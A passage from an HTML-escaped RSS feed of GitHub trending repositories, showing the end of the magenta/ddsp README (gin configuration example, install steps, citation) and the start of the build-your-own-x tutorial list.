loss &lt;span class="pl-k"&gt;=&lt;/span&gt; spectral_loss(audio, audio_input)&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-processorgroup-with-gin" class="anchor" aria-hidden="true" href="#processorgroup-with-gin"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ProcessorGroup (with &lt;code&gt;gin&lt;/code&gt;)&lt;/h3&gt;
&lt;p&gt;The main advantage of a ProcessorGroup is that it can be defined with a &lt;code&gt;.gin&lt;/code&gt; file, allowing flexible configurations without having to write new python code for every new DAG.&lt;/p&gt;
&lt;p&gt;In the example below we pretend we have an external file written, which we treat here as a string. Now, after parsing the gin file, the ProcessorGroup will have its arguments configured on construction.&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; ddsp
&lt;span class="pl-k"&gt;import&lt;/span&gt; gin

gin_config &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"""&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;import ddsp&lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;/span&gt;
&lt;span class="pl-s"&gt;processors.ProcessorGroup.dag = [&lt;/span&gt;
&lt;span class="pl-s"&gt;  (@ddsp.synths.Additive(),&lt;/span&gt;
&lt;span class="pl-s"&gt;   ['amplitudes', 'harmonic_distribution', 'f0_hz']),&lt;/span&gt;
&lt;span class="pl-s"&gt;  (@ddsp.synths.FilteredNoise(),&lt;/span&gt;
&lt;span class="pl-s"&gt;   ['magnitudes']),&lt;/span&gt;
&lt;span class="pl-s"&gt;  (@ddsp.processors.Add(),&lt;/span&gt;
&lt;span class="pl-s"&gt;   ['filtered_noise/signal', 'additive/signal']),&lt;/span&gt;
&lt;span class="pl-s"&gt;  (@ddsp.effects.TrainableReverb(),&lt;/span&gt;
&lt;span class="pl-s"&gt;   ['add/signal'])&lt;/span&gt;
&lt;span class="pl-s"&gt;]&lt;/span&gt;
&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"""&lt;/span&gt;&lt;/span&gt;

&lt;span class="pl-k"&gt;with&lt;/span&gt; gin.unlock_config():
  gin.parse_config(gin_config)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Get synthesizer parameters from the input audio.&lt;/span&gt;
outputs &lt;span class="pl-k"&gt;=&lt;/span&gt; network(audio_input)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Initialize signal processors, arguments are configured by gin.&lt;/span&gt;
processor_group &lt;span class="pl-k"&gt;=&lt;/span&gt; ddsp.processors.ProcessorGroup()

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Generate audio.&lt;/span&gt;
audio &lt;span class="pl-k"&gt;=&lt;/span&gt; processor_group(outputs)

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Multi-scale spectrogram reconstruction loss.&lt;/span&gt;
loss &lt;span class="pl-k"&gt;=&lt;/span&gt; spectral_loss(audio, audio_input)&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-a-word-about-gin" class="anchor" aria-hidden="true" href="#a-word-about-gin"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;A word about &lt;code&gt;gin&lt;/code&gt;...&lt;/h2&gt;
&lt;p&gt;The &lt;a href="https://github.com/google/gin-config"&gt;gin&lt;/a&gt; library is a "super power" of
dependency injection, and we find it very helpful for our experiments, but
with great power comes great responsibility. There are two methods for injecting dependencies with gin.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@gin.configurable&lt;/code&gt;
makes a function globally configurable, such that &lt;em&gt;anywhere&lt;/em&gt; the function or
object is called, gin sets its default arguments/constructor values. This can
lead to a lot of unintended side-effects.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;@gin.register&lt;/code&gt; registers a function
or object with gin, and only sets the default argument values when the function or object itself is used as an argument to another function.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To "use gin responsibly", by wrapping most
functions with &lt;code&gt;@gin.register&lt;/code&gt; so that they can be specified as arguments of more "global" &lt;code&gt;@gin.configurable&lt;/code&gt; functions/objects such as &lt;code&gt;ProcessorGroup&lt;/code&gt; in the main library and
&lt;code&gt;Model&lt;/code&gt;, &lt;code&gt;train()&lt;/code&gt;, &lt;code&gt;evaluate()&lt;/code&gt;, and &lt;code&gt;sample()&lt;/code&gt; in &lt;a href="./ddsp/training"&gt;ddsp/training&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As you can see in the code, this allows us to flexibly define hyperparameters of
most functions without worrying about side-effects. One exception is &lt;code&gt;ddsp.core.cumsum&lt;/code&gt; where we configure special optimizations for TPU.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-installation"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h1&gt;
&lt;p&gt;Requires tensorflow version &amp;gt;= 2.1.0, but runs in either eager or graph mode.&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;sudo apt-get install libsndfile-dev
pip install --upgrade pip
pip install --upgrade ddsp&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a id="user-content-contributing"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h1&gt;
&lt;p&gt;We're eager to collaborate with you! See &lt;a href="CONTRIBUTING.md"&gt;&lt;code&gt;CONTRIBUTING.md&lt;/code&gt;&lt;/a&gt;
for a guide on how to contribute.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-citation"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-citation" class="anchor" aria-hidden="true" href="#citation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Citation&lt;/h1&gt;
&lt;p&gt;If you use this code please cite it as:&lt;/p&gt;
&lt;div class="highlight highlight-text-tex-latex"&gt;&lt;pre&gt;@inproceedings{
  engel2020ddsp,
  title={{&lt;span class="pl-cce"&gt;\{&lt;/span&gt;}DDSP{&lt;span class="pl-cce"&gt;\}&lt;/span&gt;}: Differentiable Digital Signal Processing},
  author={Jesse Engel and Lamtharn (Hanoi) Hantrakul and Chenjie Gu and Adam Roberts},
  booktitle={International Conference on Learning Representations},
  year={2020},
  url={https://openreview.net/forum?id=B1x1ma4tDr}
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a id="user-content-disclaimer"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-disclaimer" class="anchor" aria-hidden="true" href="#disclaimer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disclaimer&lt;/h1&gt;
&lt;p&gt;This is not an official Google product.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>magenta</author><guid isPermaLink="false">https://github.com/magenta/ddsp</guid><pubDate>Sun, 19 Jan 2020 00:15:00 GMT</pubDate></item><item><title>danistefanovic/build-your-own-x #16 in All Languages, Today</title><link>https://github.com/danistefanovic/build-your-own-x</link><description>&lt;p&gt;&lt;i&gt;🤓 Build your own (insert technology here)&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;strong&gt;[&lt;a href="https://github.com/danistefanovic/build-your-own-x/issues/new"&gt;Submit tutorial&lt;/a&gt;]&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="" class="anchor" aria-hidden="true" href="#"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a target="_blank" rel="noopener noreferrer" href="feynman.png"&gt;&lt;img src="feynman.png" alt="Build your own X" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-table-of-contents" class="anchor" aria-hidden="true" href="#table-of-contents"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Table of contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#build-your-own-3d-renderer"&gt;3D Renderer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-augmented-reality"&gt;Augmented Reality&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-bittorrent-client"&gt;BitTorrent Client&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-blockchain--cryptocurrency"&gt;Blockchain / Cryptocurrency&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-bot"&gt;Bot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-command-line-tool"&gt;Command-Line Tool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-database"&gt;Database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-docker"&gt;Docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-emulator--virtual-machine"&gt;Emulator / Virtual Machine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-front-end-framework--library"&gt;Front-end Framework / Library&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-game"&gt;Game&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-git"&gt;Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-network-stack"&gt;Network Stack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-neural-network"&gt;Neural Network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-operating-system"&gt;Operating System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-physics-engine"&gt;Physics Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-programming-language"&gt;Programming Language&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-regex-engine"&gt;Regex Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-search-engine"&gt;Search Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-shell"&gt;Shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-template-engine"&gt;Template Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-text-editor"&gt;Text Editor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-visual-recognition-system"&gt;Visual Recognition System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-voxel-engine"&gt;Voxel Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-web-search-engine"&gt;Web Search Engine&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#build-your-own-web-server"&gt;Web Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#uncategorized"&gt;Uncategorized&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-tutorials" class="anchor" aria-hidden="true" href="#tutorials"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tutorials&lt;/h2&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-3d-renderer" class="anchor" aria-hidden="true" href="#build-your-own-3d-renderer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;3D Renderer&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.scratchapixel.com/lessons/3d-basic-rendering/introduction-to-ray-tracing/how-does-it-work" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Introduction to Ray Tracing: a Simple Method for Creating 3D Images&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ssloy/tinyrenderer/wiki"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How OpenGL works: software rendering in 500 lines of code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lodev.org/cgtutor/raycasting.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Raycasting engine of Wolfenstein 3D&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pbr-book.org/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Physically Based Rendering:From Theory To Implementation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scratchapixel.com/lessons/3d-basic-rendering/rasterization-practical-implementation/overview-rasterization-algorithm" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Rasterization: a Practical Implementation&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.davrous.com/2013/06/13/tutorial-series-learning-how-to-write-a-3d-soft-engine-from-scratch-in-c-typescript-or-javascript/" rel="nofollow"&gt;&lt;strong&gt;C# / TypeScript / JavaScript&lt;/strong&gt;: &lt;em&gt;Learning how to write a 3D soft engine from scratch in C#, TypeScript or JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://avik-das.github.io/build-your-own-raytracer/" rel="nofollow"&gt;&lt;strong&gt;Java / JavaScript&lt;/strong&gt;: &lt;em&gt;Build your own 3D renderer&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.rogach.org/2015/08/how-to-create-your-own-simple-3d-render.html" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;How to create your own simple 3D render engine in pure Java&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.gabrielgambetta.com/computer-graphics-from-scratch/introduction.html" rel="nofollow"&gt;&lt;strong&gt;JavaScript / Pseudocode&lt;/strong&gt;: &lt;em&gt;Computer Graphics from scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-3d-modeller.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A 3D Modeller&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-augmented-reality" class="anchor" aria-hidden="true" href="#build-your-own-augmented-reality"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Augmented Reality&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=uXNjNcqW4kY" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;How To: Augmented Reality App Tutorial for Beginners with Vuforia and Unity 3D&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLKIKuXdn4ZMjuUAtdQfK1vwTZPQn_rgSv" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;How To Unity ARCore&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLPCqNOwwN794Gz5fzUSi1p4OqLU0HTmvn" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;AR Portal Tutorial with Unity&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://fr-film.net/v-how-to-create-a-dragon-in-augmented-reality-in-unity-arcore-tutorial-qTSDPkPyPqs.html" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;How to create a Dragon in Augmented Reality in Unity ARCore&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=Z5AmqMuNi08" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;How to Augmented Reality AR Tutorial: ARKit Portal to the Upside Down&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bitesofcode.wordpress.com/2017/09/12/augmented-reality-with-python-and-opencv-part-1/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Augmented Reality with Python and OpenCV&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-bittorrent-client" class="anchor" aria-hidden="true" href="#build-your-own-bittorrent-client"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;BitTorrent Client&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.seanjoflynn.com/research/bittorrent.html" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Building a BitTorrent client from scratch in C#&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day02_bencode.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a Bencode Parser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://allenkim67.github.io/programming/2016/05/04/how-to-make-your-own-bittorrent-client.html" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Write your own bittorrent client&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://markuseliasson.se/article/bittorrent-in-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A BitTorrent client in Python 3.5&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-blockchain--cryptocurrency" class="anchor" aria-hidden="true" href="#build-your-own-blockchain--cryptocurrency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Blockchain / Cryptocurrency&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://beta.observablehq.com/@galletti94/functional-blockchain" rel="nofollow"&gt;&lt;strong&gt;ATS&lt;/strong&gt;: &lt;em&gt;Functional Blockchain&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://programmingblockchain.gitbooks.io/programmingblockchain/" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Programming The Blockchain in C#&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@bradford_hamilton/write-your-own-blockchain-and-pow-algorithm-using-crystal-d53d5d9d0c52" rel="nofollow"&gt;&lt;strong&gt;Crystal&lt;/strong&gt;: &lt;em&gt;Write your own blockchain and PoW algorithm using Crystal&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
